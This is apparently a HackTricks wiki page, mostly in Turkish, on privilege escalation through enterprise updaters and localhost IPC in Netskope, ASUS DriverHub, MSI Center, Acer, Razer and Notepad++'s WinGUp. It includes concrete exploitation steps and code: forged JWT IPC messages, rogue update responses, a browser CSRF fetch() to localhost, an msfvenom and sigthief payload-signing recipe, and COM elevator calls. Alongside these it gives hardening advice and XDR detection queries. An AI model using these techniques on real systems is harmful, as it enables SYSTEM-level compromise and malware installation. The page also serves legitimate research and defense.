# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük sürtünmeli bir IPC yüzeyi ve ayrıcalıklı bir güncelleme akışı açan kurumsal endpoint ajanları ve updaters içinde bulunan Windows local privilege escalation zincirleri sınıfını genelleştirir. Temsili bir örnek, düşük ayrıcalıklı bir kullanıcının enrollment'ı saldırgan kontrollü bir sunucuya zorlayabildiği ve ardından SYSTEM servisi tarafından kurulan kötü amaçlı bir MSI teslim edebildiği Netskope Client for Windows < R129 (CVE-2025-0309) örneğidir.

Tekrarlanabilir fikirler, benzer ürünlere karşı yeniden kullanılabilir:
- Ayrıcalıklı bir servisin localhost IPC'sini kötüye kullanarak re-enrollment veya yeniden yapılandırmayı saldırgan sunucuya zorlayın.
- Vendor’ın update endpoint'lerini uygulayın, rogue Trusted Root CA teslim edin ve updater'ı kötü amaçlı, “signed” pakete yönlendirin.
- Zayıf signer kontrollerinden (CN allow-lists), opsiyonel digest bayraklarından ve gevşek MSI özelliklerinden kaçının.
- Eğer IPC “encrypted” ise, registry'de saklanan ve herkes tarafından okunabilir makine tanımlayıcılarından key/IV türetin.
- Eğer servis arayanları image path/process name ile kısıtlıyorsa, allow-listed bir prosese inject edin veya birini suspended durumda başlatıp minimal bir thread-context patch ile DLL'inizi bootstrap edin.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Birçok ajan, SYSTEM servisi ile localhost TCP üzerinden JSON kullanan bir user-mode UI süreci ile birlikte gelir.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Backend host'u kontrol eden claim'lere sahip bir JWT enrollment token oluşturun (ör. AddonUrl). İmza gerekmediği için alg=None kullanın.
2) Provisioning komutunu JWT'niz ve tenant name ile çağıran IPC mesajını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için kötü amaçlı sunucunuza istek göndermeye başlar, örn.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer caller verification path/name tabanlıysa, isteği allow-listed vendor binary'den başlatın (bkz. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

İstemci sunucunuzla iletişim kurduktan sonra, beklenen endpoint'leri uygulayın ve onu bir saldırgan MSI'ye yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → JSON yapılandırması döndürün ve çok kısa bir updater aralığı belirtin, örn.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate döndürür. Servis bunu Local Machine Trusted Root store içine kurar.
3) /v2/checkupdate → kötü amaçlı bir MSI'ye ve sahte bir sürüme işaret eden metadata sağlar.

Wild'ta görülen yaygın kontrolleri atlatma:
- Signer CN allow-list: servis Subject CN'nin sadece “netSkope Inc” veya “Netskope, Inc.” olup olmadığını kontrol edebilir. Sahte CA'nız o CN ile bir leaf sertifika düzenleyip MSI'yi imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI property'si ekleyin. Kurulum sırasında zorunlu tutulmaz.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ekstra kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI'nizi
C:\ProgramData\Netskope\stAgent\data\*.msi
konumundan kurar ve NT AUTHORITY\SYSTEM olarak rastgele kodu çalıştırır.

---
## 3) Şifrelenmiş IPC isteklerini taklit etme (varsa)

R127'den itibaren Netskope, IPC JSON'u Base64 gibi görünen bir encryptData alanı içine sarıyordu. Reversing, key/IV'nin herhangi bir kullanıcı tarafından okunabilir registry değerlerinden türetilen AES olduğunu gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden üretebilir ve standart bir kullanıcıdan geçerli şifreli komutlar gönderebilir. Genel ipucu: bir agent aniden IPC'sini “encrypt” etmeye başladıysa, HKLM altındaki device ID'leri, product GUID'leri, install ID'leri gibi materyallere bakın.

---
## 4) IPC caller allow-list'lerini atlatma (path/name kontrolleri)

Bazı servisler, TCP bağlantısının PID'sini çözerek eş tarafı authenticate etmeye çalışır ve image path/name'i Program Files altındaki allow-listed vendor binarılarla karşılaştırır (ör. stagentui.exe, bwansvc.exe, epdlp.exe).

İki pratik bypass:
- Bir allow-listed procesa DLL injection yapıp içinden IPC'yi proxylemek (ör. nsdiag.exe).
- Allow-listed bir binary'i CREATE_SUSPENDED ile başlatıp CreateRemoteThread kullanmadan proxy DLL'inizi bootstrap ederek (bkz §5) driver tarafından uygulanan tamper kurallarını karşılamak.

---
## 5) Tamper-protection dostu injection: suspended process + NtContinue patch

Ürünler genellikle protected process handle'larından tehlikeli hakları sıyırmak için bir minifilter/OB callbacks driver (ör. Stadrv) ile gelir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlı bırakır

Bu kısıtlamalara saygı gösteren güvenilir bir user-mode loader:
1) Vendor binary için CREATE_SUSPENDED ile CreateProcess.
2) Hâlâ alabileceğiniz handle'ları elde edin: process için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve bir thread handle'ı için THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya bilinen bir RIP'de kodu patchliyorsanız sadece THREAD_RESUME).
3) ntdll!NtContinue (veya erken, garantiyle map edilmiş başka bir thunk) üzerine LoadLibraryW ile DLL yolunuzu çağıran küçük bir stub yazın, sonra geri atlayın.
4) ResumeThread ile in-process stub'ınızı tetikleyin ve DLL'inizin yüklenmesini sağlayın.

Çünkü zaten korumalı bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadınız (proses'i siz oluşturdunuz), driver'ın politikası sağlanmış olur.

---
## 6) Pratik tooling
- NachoVPN (Netskope plugin) rogue CA, kötü amaçlı MSI imzalama ve gerekli endpoint'leri otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope, isteğe bağlı AES-şifreli arbitrary IPC mesajları oluşturan ve allow-listed bir binary'den kaynaklanacak şekilde suspended-process injection içeren özel bir IPC client'tır.

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage workflow

Yeni bir endpoint agent veya anakart “helper” suite ile karşılaştığınızda, hızlı bir workflow genellikle bunun privesc hedefi olup olmadığını anlamaya yeterlidir:

1) Loopback dinleyicilerini enumerate edin ve bunları vendor process'lere map edin:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Aday named pipe'ları listele:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Eklenti tabanlı IPC sunucuları tarafından kullanılan kayıt defterine dayalı yönlendirme verilerini çıkarın:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Endpoint isimlerini, JSON anahtarlarını ve komut ID'lerini önce kullanıcı modu istemcisinden çıkarın. Packed Electron/.NET frontend'leri sıklıkla tüm şemayı leak eder:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Eğer hedef yalnızca PID, image path veya process name ile çağıranları doğruluyorsa, bunu bir sınır yerine bir engel olarak değerlendirin: meşru istemciye enjekte etmek veya izin-listesinde olan bir process'ten bağlantı kurmak genellikle sunucunun kontrollerini tatmin etmek için yeterlidir. Özellikle named pipes için, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) ilkelini daha derinlemesine ele alır.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde kullanıcı modu bir HTTP servisi (ADU.exe) sağlar ve tarayıcı çağrılarının https://driverhub.asus.com'dan gelmesini bekler. Origin filtresi basitçe Origin başlığı ve `/asus/v1.0/*` tarafından açığa çıkarılan indirme URL'leri üzerinde `string_contains(".asus.com")` çalıştırır. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi herhangi bir saldırgan kontrollü host kontrolleri geçer ve JavaScript'ten state-değiştiren istekler yapabilir. Ek baypas desenleri için bkz. [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md).

Pratik akış:
1) `.asus.com` içeren bir domain kaydı yapın ve orada kötü amaçlı bir web sayfası barındırın.
2) `fetch` veya XHR kullanarak `http://127.0.0.1:53000` üzerindeki ayrıcalıklı bir endpoint'e (ör. `Reboot`, `UpdateApp`) çağrı yapın.
3) Handler'ın beklediği JSON gövdesini gönderin – paketlenmiş frontend JS aşağıda şemayı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI bile, Origin header güvenilen değere spoofed edildiğinde başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

Akışı silahlandırmak için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS’un signer'ını içine klonlayın (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe`'yi `.asus.com` benzeri bir domainde barındırın ve yukarıdaki tarayıcı CSRF ile UpdateApp'i tetikleyin.

Origin ve URL filtreleri alt dize tabanlı ve signer kontrolü sadece dizeleri karşılaştırdığından, DriverHub saldırgan ikiliyi yükseltilmiş bağlamında çeker ve çalıştırır.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM servisi, her frametin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` olduğu bir TCP protokolü açığa çıkarır. Çekirdek bileşen (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` ile gelir. Bunun işleyicisi:
1) Sağlanan yürütülebilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe` olarak kopyalar.
2) İmzayı `CS_CommonAPI.EX_CA::Verify` ile doğrular (sertifika subject'ı “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Temp dosyayı SYSTEM olarak saldırgan kontrollü argümanlarla çalıştıran bir zamanlanmış görev oluşturur.

Kopyalanan dosya doğrulama ile `ExecuteTask()` arasında kilitlenmez. Bir saldırgan şunları yapabilir:
- İmzalı, meşru bir MSI ikilisine işaret eden Frame A gönderir (imza kontrolünün geçmesini ve görevin kuyruğa alınmasını garanti eder).
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe`'yi üzerine yazarak kötü amaçlı bir payload'ı işaret eden tekrar eden Frame B mesajları ile yarışır.

Zamanlayıcı tetiklendiğinde, orijinal dosya doğrulanmış olmasına rağmen üzerine yazılmış payload'ı SYSTEM altında çalıştırır. Güvenilir sömürü, TOCTOU penceresi kazanılana kadar CMD_AutoUpdateSDK'yi spamleyen iki goroutine/thread kullanır.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir frametin ilk 4 baytı o bileşeni seçer ve saldırganların komutları rastgele modüllere yönlendirmesine izin verir.
- Plugin'ler kendi task runner'larını tanımlayabilir. `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`'ü açığa çıkarır ve **hiçbir imza doğrulaması olmadan** doğrudan `API_Support.EX_Task::ExecuteTask()`'i çağırır – herhangi bir yerel kullanıcı bunu `C:\Users\<user>\Desktop\payload.exe`'ye yönlendirip deterministik şekilde SYSTEM çalıştırma elde edebilir.
- Loopback'i Wireshark ile sniff'lemek veya .NET ikililerini dnSpy ile enstrümente etmek Component ↔ command eşlemesini hızlıca açığa çıkarır; özel Go/Python client'lar daha sonra frame'leri yeniden oynatabilir.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode`'ı açığa çıkarır ve discretionary ACL'si uzak istemcilere (örn. `\\TARGET\pipe\treadstone_service_LightMode`) izin verir. Komut ID `7` ile bir dosya yolu gönderilmesi servisin süreç başlatma rutinini çağırır.
- Client kütüphanesi argümanlarla birlikte bir magic terminator byte (113) seri hale getirir. Frida/`TsDotNetLib` ile dinamik enstrümantasyon (enstrümantasyon ipuçları için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bakın) yerel handler'ın bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID'e eşlediğini ve ardından `CreateProcessAsUser`'ı çağırdığını gösterir.
- 113 (`0x71`) yerine 114 (`0x72`) kullanmak, tam SYSTEM token'ını tutan ve yüksek-integrity SID (`S-1-16-12288`) ayarlayan genel dala düşürür. Spawn edilen ikili bu nedenle hem yerel hem de makineler arası olarak kısıtlama olmayan SYSTEM olarak çalışır.
- Bunu açığa çıkmış installer bayrağı (`Setup.exe -nocheck`) ile birleştirerek ACC'yi laboratuvar VM'lerinde bile ayağa kaldırıp vendor donanımı olmadan pipe üzerinde çalışabilirsiniz.

Bu IPC hataları, localhost servislerinin karşılıklı kimlik doğrulamayı (ALPC SIDs, `ImpersonationLevel=Impersonation` filtreleri, token filtreleme) neden uygulaması gerektiğini ve her modülün “arbitrary binary çalıştır” yardımcısının neden aynı signer doğrulamalarını paylaşması gerektiğini vurgular.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 bu aileye başka bir yararlı desen ekledi: düşük ayrıcalıklı bir kullanıcı, `RzUtility.Elevator` aracılığıyla bir COM helper'dan bir süreç başlatmasını isteyebilir; güven kararının privilegiated sınırın içinde sağlam bir şekilde uygulanmak yerine bir user-mode DLL (`simple_service.dll`)'ye devredildiği görülüyor.

Gözlemlenen sömürü yolu:
- COM nesnesi `RzUtility.Elevator`'ı örnekleyin.
- Yükseltilmiş bir başlatma istemek için `LaunchProcessNoWait(<path>, "", 1)` çağrısı yapın.
- Public PoC'da, `simple_service.dll` içindeki PE-imza kapısı isteği yapmadan önce yamalanmış olup, bu da herhangi bir saldırgan seçimi yürütülebilir dosyanın başlatılmasına izin verir.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Zayıf updater doğrulaması yoluyla uzaktan tedarik zinciri kaçırma (WinGUp / Notepad++)

Daha eski WinGUp tabanlı Notepad++ updaters güncelleme özgünlüğünü tam olarak doğrulamıyordu. Saldırganlar update server'ın hosting sağlayıcısını ele geçirdiğinde XML manifest üzerinde değişiklik yapıp sadece seçilmiş istemcileri saldırgan URL'lerine yönlendirebiliyorlardı. İstemci, herhangi bir HTTPS yanıtını trusted certificate chain ve geçerli bir PE signature zorunluluğu olmadan kabul ettiğinden, kurbanlar trojanlanmış NSIS `update.exe` dosyasını indirip çalıştırdı.

Operasyonel akış (no local exploit required):
1. **Infrastructure interception**: CDN/hosting'i ele geçirip update kontrollerine saldırgan metadata'sı ile kötü amaçlı indirme URL'sine işaret eden yanıt verin.
2. **Trojanized NSIS**: installer yüklemeyi indirir/çalıştırır ve iki yürütme zincirinden faydalanır:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` dosyasını paketleyin ve arama yoluna kötü amaçlı `log.dll` bırakın. Signed binary çalıştığında Windows `log.dll`'i sideload eder; bu DLL Chrysalis backdoor'u şifre çözerek ve reflectively yükleyerek çalıştırır (Warbird-protected + API hashing statik tespiti zorlaştırmak için).
- **Scripted shellcode injection**: NSIS derlenmiş bir Lua scripti çalıştırır; bu script Win32 API'lerini (ör. `EnumWindowStationsW`) kullanarak shellcode enjekte eder ve Cobalt Strike Beacon'ı aşama olarak yerleştirir.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ olmayan bir yükleyiciyi çalıştırıyor</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu desenler, unsigned manifests kabul eden veya installer signers'ı pin'lemeyen herhangi bir updater'a genellenir — network hijack + malicious installer + BYO-signed sideloading, “trusted” güncellemeler kisvesi altında remote code execution'e yol açar.

---
## Referanslar
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
